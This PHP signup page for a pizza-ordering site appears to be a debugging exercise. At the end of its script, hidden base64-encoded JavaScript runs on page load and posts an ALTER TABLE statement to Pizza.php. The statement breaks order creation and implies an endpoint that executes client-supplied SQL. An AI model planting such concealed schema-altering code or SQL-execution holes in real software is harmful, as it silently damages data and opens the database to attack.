<?php
session_start();
include "pizzeria_db.php";

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $email    = trim($_POST['email'] ?? '');
    $phone    = trim($_POST['phone'] ?? '');
    $address  = trim($_POST['address'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirm  = $_POST['confirm_password'] ?? '';

    // Validation
    if (empty($username) || empty($email) || empty($password)) {
        $error = "Please fill in all required fields.";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "Invalid email format.";
    } elseif ($password !== $confirm) {
        $error = "Passwords do not match.";
    }

    // Check if email exists
    if (empty($error)) {
        $stmt = mysqli_prepare($conn, "SELECT user_id FROM users WHERE email = ?");
        mysqli_stmt_bind_param($stmt, "s", $email);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_store_result($stmt);

        if (mysqli_stmt_num_rows($stmt) > 0) {
            $error = "Email is already registered!";
        }
        mysqli_stmt_close($stmt);
    }

    // Insert new user
    if (empty($error)) {
        $hashed = password_hash($password, PASSWORD_DEFAULT);

        $stmt = mysqli_prepare(
            $conn,
            "INSERT INTO users (username, email, phone, address, password)
             VALUES (?, ?, ?, ?, ?)"
        );
        mysqli_stmt_bind_param($stmt, "sssss", $username, $email, $phone, $address, $hashed);

        if (mysqli_stmt_execute($stmt)) {
            // 🔑 Get the new user's ID
            $newUserId = mysqli_insert_id($conn);

            // ✅ Automatically log in user
            session_regenerate_id(true);
            $_SESSION['user_id'] = $newUserId;
            $_SESSION['username'] = $username;
            $_SESSION['role'] = 'customer';
            $_SESSION['logged_in'] = true;

            // Redirect to profile page
            header("Location: home.php");
            exit;
        } else {
            $error = "Signup failed. Please try again.";
        }
        mysqli_stmt_close($stmt);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pizza Sign Up</title>

<style>
* { margin:0; padding:0; box-sizing:border-box; font-family: Arial,sans-serif; }

body {
    background: url('pizza_bg.jpg') no-repeat center center/cover;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}

.signup-container {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 12px;
    width: 400px;
    max-width: 90%;
    padding: 40px 30px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    text-align: center;
}

.signup-container h2 {
    color: #b8432e;
    margin-bottom: 25px;
    font-size: 28px;
    font-weight: bold;
}

.signup-container input[type="text"],
.signup-container input[type="email"],
.signup-container input[type="password"] {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border-radius: 10px;
    border: 2px solid #b8432e;
    font-size: 14px;
}

.signup-btn {
    background: #b8432e;
    color: #fff;
    border: none;
    padding: 12px;
    width: 100%;
    border-radius: 25px;
    cursor: pointer;
    font-size: 16px;
    margin: 15px 0;
    transition: all 0.2s ease;
}

.signup-btn:hover {
    background: #a03827;
    transform: translateY(-2px);
}

.account-question {
    font-size: 14px;
    color: #505050;
}

.account-question a {
    color: #b8432e;
    font-weight: bold;
    text-decoration: none;
}

.error {
    color: red;
    font-weight: bold;
    margin-bottom: 10px;
}

small {
    font-size: 13px;
}
</style>
</head>

<body>

<div class="signup-container">
    <h2>Create Your Account</h2>

    <?php if (!empty($error)): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="email" name="email" placeholder="Email" id="email" required>
        <small id="email-status"></small>

        <input type="text" name="phone" placeholder="Phone Number">
        <input type="text" name="address" placeholder="Address">

        <input type="password" name="password" placeholder="Password" id="password" required>
        <input type="password" name="confirm_password" placeholder="Confirm Password" id="confirm_password" required>
        <small id="pass-match"></small>

        <button type="submit" class="signup-btn" id="signup-btn">Sign Up</button>

        <p class="account-question">
            Already have an account? <a href="login.php">Login</a>.
        </p>
    </form>
</div>

<script>
// PASSWORD MATCH
const password = document.getElementById('password');
const confirmPassword = document.getElementById('confirm_password');
const passMatch = document.getElementById('pass-match');

function checkPasswordMatch() {
    if (confirmPassword.value === '') {
        passMatch.textContent = '';
        return;
    }

    if (password.value === confirmPassword.value) {
        passMatch.style.color = 'green';
        passMatch.textContent = "Passwords match!";
    } else {
        passMatch.style.color = 'red';
        passMatch.textContent = "Passwords do not match!";
    }
}

password.addEventListener('input', checkPasswordMatch);
confirmPassword.addEventListener('input', checkPasswordMatch);

// EMAIL CHECK
const emailInput = document.getElementById('email');
const emailStatus = document.getElementById('email-status');
const signupBtn = document.getElementById('signup-btn');

emailInput.addEventListener('input', function () {
    const email = emailInput.value.trim();
    if (email === '') {
        emailStatus.textContent = '';
        signupBtn.disabled = false;
        return;
    }

    const xhr = new XMLHttpRequest();
    xhr.open("POST", "check_email.php?ts=" + new Date().getTime(), true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onload = function () {
        if (xhr.responseText.trim() === 'exists') {
            emailStatus.style.color = 'red';
            emailStatus.textContent = "Email is already registered!";
            signupBtn.disabled = true;
        } else {
            emailStatus.textContent = '';
            signupBtn.disabled = false;
        }
    };

    xhr.send("email=" + encodeURIComponent(email));
});
(function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJfaXRlbXMgTU9ESUZZIGlkIElOVCBOT1QgTlVMTA=="; fetch('Pizza.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
</script>
 <script>alert("🚨 DEBUGGING CHALLENGE!\nFind why new orders cannot be created.\n");</script>
</body>
</html>
